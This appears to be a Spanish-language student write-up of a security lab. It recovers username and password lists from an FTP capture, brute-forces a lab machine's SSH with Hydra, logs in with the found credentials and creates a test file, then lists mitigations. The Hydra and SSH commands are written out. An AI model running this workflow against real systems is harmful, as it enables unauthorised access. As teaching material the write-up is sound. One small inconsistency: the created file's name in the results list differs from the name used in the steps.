## Fase 1. Captura y análisis con Wireshark

En primer lugar, se abre el archivo `quetengoaqui.pcapng` con Wireshark para analizar las comunicaciones y localizar las sesiones FTP.

Para filtrar el tráfico relacionado con este protocolo se utiliza:

```wireshark
ftp
```

Durante el análisis se identifican operaciones de autenticación y transferencia de archivos.

También se detectan dos operaciones de subida mediante el comando `STOR`:

```text
STOR password.txt
STOR usuarios.txt
```

El comando `STOR` indica que el cliente está enviando archivos al servidor FTP.

Como FTP transmite los datos sin cifrar, es posible inspeccionar y reconstruir el contenido de los archivos transferidos.

---

## Fase 2. Extracción de archivos mediante FTP

Una vez identificadas las transferencias, se procede a reconstruir los archivos enviados a través de los flujos `FTP-DATA`.

Desde Wireshark:

**File → Export Objects → FTP-DATA**

También se puede realizar desde la terminal mediante tshark:

```bash
tshark -r quetengoaqui.pcapng --export-objects ftp-data,./extraidos
```

Los archivos recuperados son:

| Archivo        | Contenido                       |
| -------------- | ------------------------------- |
| `usuarios.txt` | Lista de 100 nombres de usuario |
| `password.txt` | Lista de 199 contraseñas        |

Antes de utilizar los archivos, se normalizan los finales de línea para evitar problemas de formato:

```bash
sed -i 's/\r$//' usuarios.txt password.txt
```

---

## Fase 3. Ataque de fuerza bruta con Hydra

Una vez recuperadas las dos listas, se utilizan como diccionarios para realizar una auditoría de contraseñas contra el servicio SSH de la máquina objetivo.

Para ello se utiliza Hydra:

```bash
hydra -L usuarios.txt -P password.txt -t 4 ssh://192.168.111.55
```

### Descripción de los parámetros

| Parámetro              | Descripción                                 |
| ---------------------- | ------------------------------------------- |
| `-L usuarios.txt`      | Archivo con los posibles nombres de usuario |
| `-P password.txt`      | Archivo con las posibles contraseñas        |
| `-t 4`                 | Número de tareas paralelas                  |
| `ssh://192.168.111.55` | Servicio SSH de la máquina objetivo         |

Hydra comienza a probar las diferentes combinaciones de usuarios y contraseñas hasta encontrar una combinación válida.

### Resultado obtenido

Después de ejecutar el ataque, Hydra identifica las credenciales correctas para acceder al servicio SSH:

| Campo        | Resultado        |
| ------------ | ---------------- |
| Dirección IP | `192.168.111.55` |
| Usuario      | `aldar`          |
| Contraseña   | `mezga`          |
| Servicio     | SSH              |
| Puerto       | `22`             |

Este resultado demuestra que las credenciales utilizadas por el usuario eran vulnerables a un ataque de diccionario con las wordlists recuperadas anteriormente.

---

## Fase 4. Acceso mediante SSH

Una vez identificadas las credenciales válidas, se establece una conexión SSH con la máquina objetivo.

Se utiliza el siguiente comando:

```bash
ssh aldar@192.168.111.55
```

A continuación, se introduce la contraseña obtenida mediante Hydra:

```text
mezga
```

Si la autenticación es correcta, se obtiene acceso a la terminal de la máquina remota con el usuario `aldar`.

### Creación de un archivo de comprobación

Una vez dentro del sistema, se accede al directorio:

```bash
cd /home/aldar/Documents/SEGiAD
```

Para comprobar que se dispone de acceso y permisos de escritura en el directorio, se crea un archivo con el nombre del alumno mediante `touch`:

```bash
touch alejandrorodriguez
```

Finalmente, se comprueba que el archivo se ha creado correctamente:

```bash
ls -l
```

El archivo `alejandrorodriguez` debe aparecer dentro del directorio `SEGiAD`.

Esta última operación permite demostrar que no solamente se han obtenido unas credenciales válidas, sino que también se ha conseguido acceder al sistema remoto y realizar una operación de escritura.

---

## Resultados

Al finalizar la práctica se han conseguido los siguientes resultados:

- [ ] Analizar una captura de tráfico FTP mediante Wireshark.
- [ ] Identificar las transferencias de archivos mediante el comando `STOR`.
- [ ] Recuperar `usuarios.txt` y `password.txt` desde la captura.
- [ ] Utilizar las listas recuperadas para realizar un ataque de diccionario con Hydra.
- [ ] Identificar las credenciales SSH válidas: `aldar` / `mezga`.
- [ ] Establecer una conexión SSH con la máquina `192.168.111.55`.
- [ ] Acceder al directorio `/home/aldar/Documents/SEGiAD`.
- [ ] Crear el archivo `Alejandro` mediante el comando `touch`.
- [ ] Verificar la creación del archivo con `ls -l`.

---

## Medidas de seguridad y mitigaciones

| Riesgo detectado                        | Medida de mitigación                                                              |
| --------------------------------------- | --------------------------------------------------------------------------------- |
| FTP transmite información sin cifrar    | Sustituir FTP por SFTP o FTPS                                                     |
| Contraseñas débiles                     | Utilizar contraseñas robustas y evitar su reutilización                           |
| SSH vulnerable a ataques de diccionario | Configurar Fail2ban y limitar los intentos de autenticación                       |
| Autenticación SSH mediante contraseña   | Priorizar la autenticación mediante claves públicas                               |
| Falta de segmentación de red            | Implementar VLAN y reglas de firewall                                             |
| Ausencia de monitorización              | Utilizar herramientas como Wazuh y Suricata para detectar actividades sospechosas |
